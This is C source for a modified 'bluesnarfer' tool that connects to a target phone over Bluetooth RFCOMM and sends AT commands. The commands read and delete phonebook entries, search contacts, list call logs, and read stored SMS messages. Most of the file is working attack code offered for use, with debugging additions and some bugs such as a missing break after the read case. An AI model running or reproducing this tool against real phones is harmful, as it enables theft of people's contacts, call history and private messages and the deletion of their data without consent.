#include <errno.h>
#include <getopt.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <termios.h>
#include <unistd.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/rfcomm.h>

#include "bluesnarfer.h"

void parse_rw(struct opt *options, char *toparse) {

	char *ptr;
	if (ptr = strchr(toparse, '-')) {

		*ptr = 0;

		options->N_MIN = atoi(optarg);
		options->N_MAX = atoi(ptr + 1);
	} else
		options->N_MIN = options->N_MAX = atoi(optarg);
}
int info_cmd(FILE *fd);

int main(int ac, char **av) {

	struct opt options;
	int opt, dd;

	options.phonebook = options.bd_addr = options.smsbook = 0x00;

	options.act = 0;
	options.channel = 17;

	if (getuid()) {

		fprintf(stderr, "bluesnarfer: you must be root\n");
		usage(*av);
	}

	while ((opt = getopt(ac, av, "C:S:b:c:r:w:m:M:f:s:t:ldihL")) != EOF) {

		switch (opt) {

			case 'b':
				options.bd_addr = optarg;
				break;

			case 'c':
				options.act = CUSTOM;
				options.custom_cmd = optarg;
				break;

			case 'C':
				options.channel = atoi(optarg);
				break;

			case 'r':
				options.act = READ;
				parse_rw(&options, optarg);
				break;

			case 'w':
				options.act = WRITE;
				parse_rw(&options, optarg);
				break;

			case 'f':
				options.act = SEARCH;
				options.name = optarg;
				break;

			case 's':
				options.phonebook = optarg;
				break;

			case 'S':
				options.smsbook = optarg;
				break;
			case 'l':
				options.act = LIST;
				break;

			case 'L':
				options.act = SMSL;
				break;

			case 't':
				options.type = atoi(optarg);
				printf("Here is the option entered in the prorgam: %d\n", options.type);
				break;
			case 'M':
				options.mode = atoi(optarg);
				printf("Here is the option entered in the prorgam: %d\n", options.mode);
				break;

			case 'i':
				options.act = INFO;
				break;

			case 'm':
				options.act = MESS;
				parse_rw(&options, optarg);
				printf("Yoou have choosen MESS\n");
					;
				break;

			default:
				usage(*av);
				break;
		}
	}

	if (optind > 5 && !(options.phonebook || options.channel)) {

		fprintf(stderr, "bluesnarfer: use only one action\n");
		exit(0);
	}

	if (!options.bd_addr) {

		fprintf(stderr, "bluesnarfer: you must set bd_addr\n");
		usage(*av);
	}

	if (!options.act) {

		fprintf(stderr, "bluesnarfer: select an action\n");
		usage(*av);
	}

	bluesnarfer(options);

	exit(0);
}
int switch_cmd(FILE *fd, struct opt options) {

	int ret;

	switch (options.act) {

		case CUSTOM:
			//fprintf(stderr, "ret = custom_cmd(fd, options.custom_cmd);\n");
			ret = custom_cmd(fd, options.custom_cmd);
			break;

		case READ:
			ret = rw_cmd(fd, options);
		//	break;

		case WRITE:
			ret = rw_cmd(fd, options);
			break;

		case MESS:
			ret = rw_sms(fd, options);
			printf("you have choosen MESS AT SWITCH\n");
			break;

		case SEARCH:
			//fprintf(stderr, "ret = search_cmd(fd, options);\n");
			ret = search_cmd(fd, options);
			break;

		case LIST:
			//fprintf(stderr, "ret = list_cmd(fd);\n");
			ret = list_cmd(fd);
			break;

		case SMSL:
			//fprintf(stderr, "ret = list_cmd(fd);\n");
			ret = list_sms(fd);
			break;

		case INFO:
			//fprintf(stderr, "ret = info_cmd(fd);\n");
			ret = info_cmd(fd);
			break;
	}

	return ret;
}


int bluesnarfer(struct opt options) {

	FILE *fd;

	signal(SIGINT, (void *)bt_rfcomm_rel);
	signal(SIGSEGV, (void *)bt_rfcomm_rel);

	if ((device = hci_for_each_dev(HCI_UP, 0x00, 0)) < 0)
		fprintf(stderr, "bluesnarfer: hci_for_each_dev , %s\n",
				strerror(errno));

	//fprintf(stderr, "bluesnarfer: bt_get_remote_name(options.bd_addr)\n");
	if (bt_get_remote_name(options.bd_addr) < 0)
		fprintf(stderr, "bluesnarfer: unable to get device name\n");

	//fprintf(stderr, "bluesnarfer: creating RFCOMM control socket\n");
	if ((ctl = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_RFCOMM)) < 0)
		fprintf(stderr,
				"bluesnarfer: Can't open RFCOMM control socket");

	//fprintf(stderr, "bluesnarfer: calling bt_rfcomm(ctl, options.bd_addr, "
	//                "options.channel)\n");
	if (!(fd = bt_rfcomm(ctl, options.bd_addr, options.channel)))
		fprintf(stderr,
				"bluesnarfer: unable to create rfcomm connection\n");

	//fprintf(stderr, "bluesnarfer: calling switch_cmd(fd, options)\n");
	if (switch_cmd(fd, options) < 0)
		fprintf(stderr, "bluesnarfer: send_cmd failed\n");

	bt_rfcomm_rel();

	return 0;
}

void usage(char *bin) {

	fprintf(stderr,
			"bluesnarfer, version %s -\n"
			"usage: %s [options] [ATCMD] -b bt_addr\n\n"
			"ATCMD     : valid AT+CMD (GSM EXTENSION)\n\n"
			"TYPE      : valid phonebook type ..\n"
			"example   : \"DC\" (dialed call list)\n"
			"            \"SM\" (SIM phonebook)\n"
			"            \"RC\" (recevied call list)\n"
			"            \"XX\" much more\n\n"
			"-b bdaddr : bluetooth device address\n"
			"-C chan   : bluetooth rfcomm channel\n\n"
			"-c ATCMD  : custom action\n"
			"-r N-M    : read phonebook entry N to M \n"
			"-w N-M    : delete phonebook entry N to M\n"
			"-f name   : search \"name\" in phonebook address\n"
			"-s TYPE   : select phonebook memory storage\n"
			"-l        : list aviable phonebook memory storage\n"
			"-i        : device info\n",
			VERSION, bin);
	exit(0);
}

int bt_get_remote_name(char *str_bdaddr) {

	struct hci_conn_info_req cr;
	int dd, cc, handler;
	char name[248];
	bdaddr_t bdaddr;

	if ((dd = hci_open_dev(device)) < 0) {

		fprintf(stderr, "bluesnarfer: hci_open_dev : %s\n",
				strerror(errno));
		return -1;
	}

	str2ba(str_bdaddr, &bdaddr);

	memcpy(&cr.bdaddr, &bdaddr, sizeof(bdaddr_t));
	cr.type = ACL_LINK;

	if (ioctl(dd, HCIGETCONNINFO, (unsigned long)&cr) < 0) {

		if ((cc = hci_create_connection(dd, &bdaddr,
						htobs(HCI_DM1 | HCI_DH1), 0, 0,
						(void *)&handler, 25000)) < 0) {

			fprintf(stderr,
					"bluesnarfer: hci_create_connection failed\n");
			hci_close_dev(dd);

			return -1;
		}
	}

	if (hci_read_remote_name(dd, &bdaddr, 248, name, 25000)) {

		fprintf(stderr, "bluesnarfer: hci_read_remote_name failed\n");

		hci_close_dev(dd);
		hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
				10000);

		return -1;
	}

	printf("device name: %s\n", name);

	if (cc)
		hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
				10000);

	hci_close_dev(dd);
	return 0;
}

char *rfcomm_read(FILE *fp, char *send) {


	int r, ret;
	char *line;

	long unsigned int line_size;

	line = 0x00;
	ret = line_size = 0;

	while (1) {

		r = getline(&line, &line_size, fp);
		printf("Response From Device: %s\n", line);

		// reads from the file stream, and stores it in the line variable 

		line[r - 1] = 0; // this is done to remove the newlin char placed by get line 
//		printf("Line MINUS r: %s\n", line);
		
		if (!strncmp(line, send, strlen(line)) && !ret) {
			// used to check if LINE and SEND 
			// if they match ret is not set and the desired command has been found 
			// and ret is then set to 1 and contineus the loop to the next command 
			ret = 1;
			continue;
		}

		if (strncmp(line, send, strlen(line)) && ret){
//			printf("here is the line%s\n", line);
			return line;
		}
	}

	return 0x00;// returns nothing and clears the file for memory 
}

FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel) {

	struct rfcomm_dev_req req;
	int device, ctl;
	bdaddr_t bdaddr;
	FILE *fd;

	//fprintf(stderr, "calling hci_get_route(0x00)\n");
	if ((device = hci_get_route(0x00)) < 0) {

		fprintf(stderr, "bluesnarfer: hci_get_route local failed\n");
		return 0x00;
	}

	str2ba(str_bdaddr, &bdaddr);

	memset(&req, 0x00, sizeof(req));

	req.dev_id = device;
	req.channel = channel;

	memcpy(&req.src, BDADDR_ANY, sizeof(bdaddr_t));
	memcpy(&req.dst, &bdaddr, sizeof(bdaddr));

	//fprintf(stderr, "calling ioctl(sock, RFCOMMCREATEDEV, &req)\n");
	if (ioctl(sock, RFCOMMCREATEDEV, &req) < 0) {

		fprintf(stderr,
				"bluesnarfer: ioctl RFCOMMCREATEDEV failed, %s\n",
				strerror(errno));
		return 0x00;
	}

	//fprintf(stderr, "calling bt_rfcomm_config()\n");
	if (!(fd = bt_rfcomm_config())) {

		fprintf(stderr, "bluesnarfer: bt_rfcomm_config failed\n");
		return 0x00;
	}

	return fd;
}

FILE *bt_rfcomm_config() {

	char dev_device[1024];
	struct termios term;
	FILE *fd;
	int fdc;

	snprintf(dev_device, 1024, "%s%d", RFCOMMDEV, device);

	//fprintf(stderr, "opening %s\n", dev_device);
	if (!(fd = fopen(dev_device, "r+"))) {
		fprintf(stderr, "bluesnarfer: open %s, %s\n", dev_device,
				strerror(errno));
		return 0x00;
	}

	fdc = fileno(fd);

	//fprintf(stderr, "calling tcgetattr(fdc, &term)\n");
	if (tcgetattr(fdc, &term) < 0) {

		fprintf(stderr, "bluesnarfer: tcgetattr failed, %s\n",
				strerror(errno));
		return 0x00;
	}

	term.c_cflag = CS8 | CLOCAL | CREAD;
	term.c_iflag = ICRNL;
	term.c_oflag = 0;
	term.c_lflag = ICANON;

	tcsetattr(fdc, TCSANOW, &term);

	if ((cfsetispeed(&term, B230400) < 0) ||
			(cfsetospeed(&term, B230400) < 0)) {

		fprintf(stderr, "bluesnarfer: cfset(i/o)speed failed, %s\n",
				strerror(errno));
		return 0x00;
	}

	return fd;
}

// i can do it better ..

// raw output ..
int custom_cmd(FILE *fd, char *cmd) {

	char buffer[128], *ptr;
	int r, bsize;

	if (!strstr(cmd, "AT")) {

		printf("bluesnarfer: invalid command inserted, you must insert "
				"AT.*\n");
		return -1;
	}

	snprintf(buffer, 128, "%s\r\n", cmd);

	if (!fwrite(buffer, strlen(buffer), 1, fd)) {

		fprintf(stderr, "bluesnarfer: fwrite, %s", strerror(errno));
		return -1;
	}

	printf("custum cmd selected, raw output\n");

	if (!(ptr = rfcomm_read(fd, buffer))) {

		fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
		return -1;
	}

	printf("%s\n", ptr);

	return 0;
}

void bt_rfcomm_rel() {

	struct rfcomm_dev_req req;

	memset(&req, 0x00, sizeof(req));
	req.dev_id = device;

	if (ioctl(ctl, RFCOMMRELEASEDEV, &req) < 0) {

		fprintf(stderr, "bluesnarfer: unable to relase rfcomm\n");
		exit(-1);
	}

	printf("bluesnarfer: release rfcomm ok\n");

	exit(0);
}

int rw_cmd(FILE *fd, struct opt options) {

	char buffer[32];
	char *ptr, *tptr;

	if (!options.phonebook) {

		fwrite(DEFAULTPB, strlen(DEFAULTPB), 1, fd);

		rfcomm_read(fd, DEFAULTPB);
	} else {

		printf("custom phonebook selected\n");
		snprintf(buffer, 32, "AT+CPBS=\"%s\"\r\n", options.phonebook);// takes in the phonebook memory!
		fwrite(buffer, strlen(buffer), 1, fd);

		rfcomm_read(fd, buffer);
	}

	do {

		if (options.act == READ)
			snprintf(buffer, 32, "AT+CPBR=%d\r\n", options.N_MIN); //AT+CPBR= means it ment to read ! AT+CPBR= means WRITE

		else
			snprintf(buffer, 32, "AT+CPBW=%d\r\n", options.N_MIN);

		if (!fwrite(buffer, strlen(buffer), 1, fd)) {

			fprintf(stderr, "bluesnarfer: write, %s",
					strerror(errno));
			return -1;
		}

		if (options.act == READ) {

			if (!(ptr = rfcomm_read(fd, buffer))) {

				fprintf(stderr,
						"bluesnarfer: rfcomm_read failed\n");
				return -1;
			}

			if (tptr = parse(ptr)) {

				printf("%s\n", tptr);
				free(tptr);
			}
		} else {

			if (!rfcomm_read(fd, buffer)) {

				fprintf(stderr,
						"bluesnarfer: rfcomm_read failed\n");
				return -1;
			}

			printf("delete of entry %d successfull\n",
					options.N_MIN);
		}

		options.N_MIN++;

	} while (options.N_MIN <= options.N_MAX);

	return 0;
}



int search_cmd(FILE *fd, struct opt options) {

	char buffer[256], *ptr, *p;

	printf("start to search name: %s\n", options.name);

	if (options.phonebook)
		snprintf(buffer, 256, "AT+CPBS=\"%s\"\r\n", options.phonebook);
	else
		snprintf(buffer, 256, "AT+CPBS=\"ME\"\r\n");

	if (!fwrite(buffer, strlen(buffer), 1, fd)) {

		fprintf(stderr, "bluesnarfer: fwrite failed\n");
		return -1;
	}

	rfcomm_read(fd, buffer);

	snprintf(buffer, 256, "AT+CPBF=\"%s\"\r\n", options.name);
	if (!fwrite(buffer, strlen(buffer), 1, fd)) {

		fprintf(stderr, "bluesnarfer: fwrite failed\n");
		return -1;
	}

	if (!(ptr = rfcomm_read(fd, buffer))) {

		fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
		return -1;
	}

	if (!(p = parse(ptr)))
		printf("bluesnarfer: entry not found\n");
	else
		printf("%s\n", p);

	return 0;
}

int list_cmd(FILE *fd) {

	char buffer[] = "AT+CPBS=?\r\n";
	char *c, *ptr;
	char *phonebook[] = {"DC", "EN", "FD", "LD", "MC", "MT",
		"ON", "RC", "SM", "TA", NULL};
	char *pbd[] = {" DC  - Dialled call list\n",
		" EN  - Emergency number list\n",
		" FD  - SIM fix dialing list\n",
		" LD  - SIM last dialing list\n",
		" MC  - ME missed call list\n",
		" MT  - ME + SIM conbined list\n",
		" ON  - SIM o ME own number list\n",
		" RC  - ME received calls list\n",
		" SM  - SIM phonebook list\n",
		" TA  - TA phonebook list\n",
		NULL};
	int i;

	c = 0x00;

	if (!fwrite(buffer, strlen(buffer), 1, fd)) {

		fprintf(stderr, "bluesnarfer: fwrite failed\n");
		return -1;
	}

	if (!(ptr = rfcomm_read(fd, buffer))) {

		fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
		return -1;
	}

	printf("phobebook list: \n");

	ptr = strchr(ptr, '(') + 1;

	while (c = strchr(ptr, ',')) {

		*c = 0;

		for (i = 0; phonebook[i]; i++) {

			if (strstr(ptr, phonebook[i])) {

				printf("%s", pbd[i]);

				break;
			}
		}

		if (!phonebook[i])
			printf("%s - Unknow phonebook list\n", ptr);

		ptr = c + 1;
	}
}


int info_cmd(FILE *fd) {

	char buffer[128], *p;

	snprintf(buffer, 128, "AT+CGMI\r\n");
	//fprintf(stderr, "calling fwrite()\n");
	if (!fwrite(buffer, strlen(buffer), 1, fd)) {

		fprintf(stderr, "bluesnarfer: fwrite failed\n");
		return -1;
	}
	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
	p = rfcomm_read(fd, buffer);
	fprintf(stderr, "%s\n", p);

	snprintf(buffer, 128, "AT+CGMM\r\n");
	//fprintf(stderr, "calling fwrite()\n");
	if (!fwrite(buffer, strlen(buffer), 1, fd)) {

		fprintf(stderr, "bluesnarfer: fwrite failed\n");
		return -1;
	}
	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
	p = rfcomm_read(fd, buffer);
	fprintf(stderr, "%s\n", p);

	snprintf(buffer, 128, "AT+CGMR\r\n");
	//fprintf(stderr, "calling fwrite()\n");
	if (!fwrite(buffer, strlen(buffer), 1, fd)) {

		fprintf(stderr, "bluesnarfer: fwrite failed\n");
		return -1;
	}
	//fprintf(stderr, "calling rfcomm_read(fd, buffer)\n");
	p = rfcomm_read(fd, buffer);
	fprintf(stderr, "%s\n", p);

	return 0;
}


// ALL ABOUT SMS IS HERE 
// READ WRITE SMS 
int rw_sms(FILE *fd, struct opt options) {
    char buffer[128];
    char *ptr, *tptr;
	int user_inp;
	// I need to add a way to show the user what operation mode they wish to use for the phone:



    if (!options.smsbook) {
        fwrite(DEFAULTMS, strlen(DEFAULTMS), 1, fd);
        rfcomm_read(fd, DEFAULTMS);
    } else {
		/*
		snprintf(buffer, 32, "AT+CPMS=%s\r\n", options.smsbook);
		printf("This is going to be the the FIRST command and buffer: %s\n", buffer);
		rfcomm_read(fd, buffer);
		*/
        printf("Custom SMS storage selected\nLooking for available modes from the device\n");
		/*
        snprintf(buffer, 32, "AT+CMGF=?\r\n"); // dont think i need this since its at -L now
		printf("This is going to be the the FIRST command and buffer: %s\n", buffer);
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
            fprintf(stderr, "bluesnarfer: write, %s",
                    strerror(errno));
            return -1;
        }
        rfcomm_read(fd, buffer);
		printf("Please pick a mode from the available modes from the device by entering only a number: ");
		scanf("%d[^\n]",&user_inp); // wont need this since its going to be done through the command
		*/
		snprintf(buffer, 32, "AT+CMGF=%d\r\n", options.mode);
		printf("Sending mode to device: %s\n", buffer);
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
            fprintf(stderr, "bluesnarfer: write, %s",
                    strerror(errno));
            return -1;
        }
		rfcomm_read(fd, buffer);

		// this will be used in the help portion of the progam 
		printf("Choose which messages you wish to display\n"
				"Here are all the modes you can pick from: \n"
				"Recieved and Unread: \t0\n"
				"Recieved and Read: \t1\n"
				"Stored and Unsent: \t2\n"
				"Stored and Send: \t3\n"
				"ALL types: \t\t4\n");
		//scanf("%d[^\n]",&user_inp); // wont need this since its going to be a command now 

        snprintf(buffer, 32, "AT+CMGL=%d\r\n", options.type);
		printf("Setting mode and sending to device: %s\n", buffer);
        if (!fwrite(buffer, strlen(buffer), 1, fd)) {
            fprintf(stderr, "bluesnarfer: write, %s",
                    strerror(errno));
            return -1;
        }
        rfcomm_read(fd, buffer);
		//Begining of the while loop to go through a fixed amount of messages from user min and max 
		//
		while (options.N_MIN <= options.N_MAX) {
			snprintf(buffer, 32, "AT+CMGR=%d\r\n", options.N_MIN);
			rfcomm_read(fd, buffer);
			options.N_MIN++;
		}

    }

    return 0;
}


// PARSE
char *parse(char *ptr) {
    char *pa, *tptr, *indx, *status, *alpha, *length, *message;

    pa = malloc(1024);
    memset(pa, 0x00, 1024);

    // indx, status, alpha, length, message
    if (tptr = strchr(ptr, ':')) {
        indx = tptr + 1;
        if (!strlen(indx))
            return 0x00;

        tptr = strchr(indx, ',');
        status = tptr + 1;
        if (!strlen(status))
            return 0x00;

        tptr = strchr(status, ',');
        alpha = tptr + 1;
        if (!strlen(alpha))
            return 0x00;

        tptr = strchr(alpha, ',');
        length = tptr + 1;
        if (!strlen(length))
            return 0x00;

        tptr = strchr(length, ':');
        message = tptr + 1;
        if (!strlen(message))
            return 0x00;

        snprintf(pa, 1024, "+ %s - %s : %s", indx, alpha, message);

        return pa;
    }

    return NULL;
}

//LIST SMS
int list_sms(FILE *fd) {
	
char buffer[] = "AT+CPMS=?\r\n";
	// the AT+CPMS? command lists the storage locations and the memory of it as well
	char *c, *ptr;
	char *smsbook[] = {"SM", "ME", "MT", "BM", "SR", "TA", NULL};
	char *sbd[] = {" SM  - Short Message\n",
		" ME  - Mobile Equipment\n",
		" MT  - Mobile Terminated\n",
		" BM  - Broadcast Message\n",
		" SR  - Short Mess Ser Cell\n",
		" TA  - SIM Storage\n",
		NULL};
	int i;

	c = 0x00;

	if (!fwrite(buffer, strlen(buffer), 1, fd)) {

		fprintf(stderr, "bluesnarfer: fwrite failed\n");
		return -1;
	}

	if (!(ptr = rfcomm_read(fd, buffer))) {

		fprintf(stderr, "bluesnarfer: rfcomm_read failed\n");
		return -1;
	}

	printf("message storage list: \n");

	ptr = strchr(ptr, '(') + 1;

	while (c = strchr(ptr, ',')) {

		*c = 0;

		for (i = 0; smsbook[i]; i++) {

			if (strstr(ptr, smsbook[i])) {

				printf("%s", sbd[i]);

				break;
			}
		}

		if (!smsbook[i])
			printf("%s - Unknown sms list\n", ptr);

		ptr = c + 1;
	}

	memset(buffer, 0, sizeof(buffer));
	printf("Listing all available modes for SMS\n");
	snprintf(buffer, 32, "AT+CMGF=?\r\n");
	if (!fwrite(buffer, strlen(buffer), 1, fd)) {
		fprintf(stderr, "bluesnarfer: write, %s",
				strerror(errno));
		return -1;
	}
	rfcomm_read(fd, buffer);
	printf("Please select from the following modes in another cmomand:\n\n"
			"PDU Mode: \t(0)\n"
			"Text Mode: \t(1)\n\n");
	rfcomm_read(fd, buffer);

}


/*
*/
